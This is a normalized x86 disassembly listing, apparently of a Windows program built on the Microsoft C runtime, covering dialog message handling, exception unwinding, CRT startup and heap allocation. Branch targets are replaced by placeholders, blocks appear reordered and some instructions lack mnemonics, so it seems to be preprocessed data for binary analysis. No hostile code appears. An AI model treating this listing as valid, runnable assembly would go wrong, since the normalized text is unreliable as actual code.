push [ edi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
push edi
call sub_42cb1a
pop ecx
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
push eax
call sub_42cb1a
test eax eax
pop ecx
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x30
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push edi
push 0x1
push edi
jmp r-xdata
push ebx
call sub_42cb9d
push eax
push ebx
call sub_42ca76
mov esi eax
test esi esi
je r-xdata
push ebx
call sub_42cb9d
push eax
push ebx
call sub_42ca76
mov esi eax
push esi
call sub_42cb1a
test al 0x20
pop ecx
je r-xdata
call sub_42cacd
pop ecx
pop ecx
cmp esi edi
je r-xdata
mov ecx esi
call sub_441826
test eax eax
je r-xdata
push esi
call sub_42cb1a
test al 0x10
pop ecx
je r-xdata
push 0x1
push esi
push esi
jmp r-xdata
push ebx
call sub_42cb3b
sub_42ccb7
mov eax sub_4648ac
call sub_42dc88
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call [ GetFocus@IAT ]
push eax
call sub_43e7b3
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ecx + 0x1c ]
mov [ ebp - 0x24 ] ecx
and [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp ebx 0x200
jb r-xdata
cmp ebx 0x108
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0x4 ]
cmp ebx 0x100
mov [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
call sub_43e7b3
mov edi eax
mov eax [ ebp - 0x18 ]
xor esi esi
push 0x2
sub eax 0x100
mov [ ebp - 0x1c ] esi
pop ebx
je r-xdata
cmp ebx 0x209
ja r-xdata
test eax eax
mov esi eax
je r-xdata
push [ ebp + 0xc ]
push edi
call sub_42c6d6
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx + 0x8 ]
cmp ecx 0x1b
jg r-xdata
sub eax ebx
je r-xdata
cmp ebx 0x101
je r-xdata
mov edi [ GetParent@IAT ]
cmp ecx 0x25
jl r-xdata
je r-xdata
mov esi [ ebp + 0xc ]
sub eax 0x4
jne r-xdata
test esi esi
je r-xdata
cmp ebx 0x100
je r-xdata
test esi esi
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_43e7b3
cmp eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ IsDialogMessageA@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp ecx 0x26
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_42ca76
mov esi eax
test esi esi
je r-xdata
cmp ecx 0x3
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
push edi
call sub_42c6d6
cmp [ ebp - 0x18 ] 0x102
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov esi [ esi + 0x38 ]
test esi esi
je r-xdata
cmp ebx 0x102
jne r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_43e7b3
mov esi eax
test esi esi
jne r-xdata
push [ ebp - 0x20 ]
mov esi [ IsWindow@IAT ]
call esi
test eax eax
je r-xdata
mov esi [ GetFocus@IAT ]
call esi
push eax
call sub_43e7b3
cmp eax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x1c ] 0x1
cmp ecx 0x28
jle r-xdata
mov ecx esi
call sub_441826
test eax eax
jne r-xdata
cmp ecx 0x9
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
mov cx [ esi + 0x8 ]
cmp cx 0x9
jne r-xdata
test al 0x84
jne r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi + 0x8 ] 0x20
je r-xdata
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x8 ]
cmp ax 0xd
jne r-xdata
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov eax edi
mov ebx [ GetFocus@IAT ]
call ebx
push eax
call sub_43e7b3
push eax
push [ ebp - 0x14 ]
call sub_42ca03
pop ecx
pop ecx
push [ ebp - 0x24 ]
call esi
test eax eax
je r-xdata
call esi
push eax
call sub_43e7b3
push eax
call sub_42c9a6
pop ecx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x14 ]
call sub_42c6d6
test al 0x1
jne r-xdata
cmp ecx 0x2b
jne r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
push eax
call [ MessageBeep@IAT ]
jmp r-xdata
test al 0x2
jne r-xdata
cmp ecx 0xd
je r-xdata
cmp cx 0x20
jne r-xdata
test bl al
jne r-xdata
jmp r-xdata
cmp ax 0x1b
jne r-xdata
test [ esi + 0x80 ] 0x1
jne r-xdata
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
je r-xdata
call ebx
push eax
call sub_43e7b3
push eax
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_42cbca
push [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
mov eax [ eax + 0x1c ]
push [ ebp - 0x14 ]
call sub_42cb1a
test al 0x10
pop ecx
je r-xdata
xor eax eax
push eax
push eax
push eax
push 0x1
push 0xfffffdd9
push esi
mov [ ebp - 0x4 ] eax
call sub_441889
add esp 0x18
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
test edi edi
mov eax ecx
je r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_42c931
test eax eax
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
test [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_42cb9d
mov esi [ ebp - 0x14 ]
mov ecx esi
call sub_44172b
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
mov edi [ edi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_42c704
jmp r-xdata
test esi esi
mov ebx eax
jne r-xdata
push 0x1
pop edi
jmp r-xdata
push esi
call sub_42c704
push esi
push [ ebp - 0x14 ]
call sub_42ca03
pop ecx
pop ecx
jmp r-xdata
push esi
mov ecx eax
call sub_428880
jmp r-xdata
sub_42d10d
push esi
push edi
call sub_45357b
push 0xb
mov esi eax
call sub_45565c
lea edi [ esi + 0x103c ]
push 0xb
call sub_4556cc
pop edi
pop esi
retn
push esi
mov ecx edi
call sub_454d31
test esi esi
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
jmp r-xdata
sub_42d149
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_42d18b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_42d1da
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_430311
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_42d210
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_42d264
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_430b30
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_42d264
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_430311
add esp 0x20
pop ebp
retn
sub_42d289
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_42d33f
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430be3
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_42d33f
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_430311
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42d18b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42d3b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_430cab
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_430cab
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_42d430
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d472
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_42d450
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_42d506
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_42d51e
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
push 0x19
call sub_430d2a
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_430da0
pop ecx
pop ecx
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
mov al [ esi ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
and [ ebp + 0xc ] 0x0
jmp r-xdata
push 0x19
call sub_430d8b
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
xor ebx ebx
jmp r-xdata
push 0x19
call sub_430d8b
pop ecx
xor eax eax
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_42d5cd
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42d5fa
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_42d5fa
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42d656
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42d5fa
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_42d69b
push esi
call sub_42d936
push [ rw-data ]
call sub_42fb3d
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_42fb3d
add eax 0x10
push eax
push [ rw-data ]
call sub_42fe37
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_42d93f
mov eax esi
pop esi
retn
sub_42d72b
push 0x80
call sub_42dd9c
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_42dba0
mov eax [ rw-data ]
pop ecx
sub_42d75a
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_430f15
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_42d7f0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_4310a2
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_430f8a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_42d891
push edi
call sub_42d936
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_42d948
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_42d93f
pop edi
retn
push rw-data
push rw-data
call sub_42d948
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_42d962
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_4319f4
push esi
call sub_431a69
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_4310a2
push esi
push edi
mov ebx eax
call sub_431af6
push esi
push 0x1
call sub_431a46
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_42d9f4
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
sub_42da1b
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_4319c5
push esi
call sub_42da4c
push esi
mov edi eax
call sub_431a17
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_42da4c
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_4320f8
push esi
mov edi eax
call sub_43209f
push [ esi + 0x10 ]
call sub_431fbf
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_42ded6
and [ esi + 0x1c ] 0x0
pop ecx
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_432d2a
pop ecx
test eax eax
jne r-xdata
call sub_430b7c
test eax eax
jne r-xdata
push 0x1c
call sub_42dbc5
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_4329f9
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4328c7
mov [ rw-data ] eax
call sub_43267a
call sub_4325c1
call sub_42d842
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_432569
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_42dbc5
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_43b0e7
mov [ ebp - 0x60 ] eax
push eax
call sub_42d86f
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_4323f1
pop ecx
pop ecx
retn
sub_42dbe9
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_430d2a
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_430d8b
pop ecx
pop esi
retn
push esi
call sub_42ded6
pop ecx
sub_42dc30
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_42dca7
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_42dcf0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_42ddae
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_42ddda
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_433058
test eax eax
pop ecx
jne r-xdata
sub_42ddda
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_430d2a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_43340f
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_42de41
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_433eb2
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_42dea0
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_42ded6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
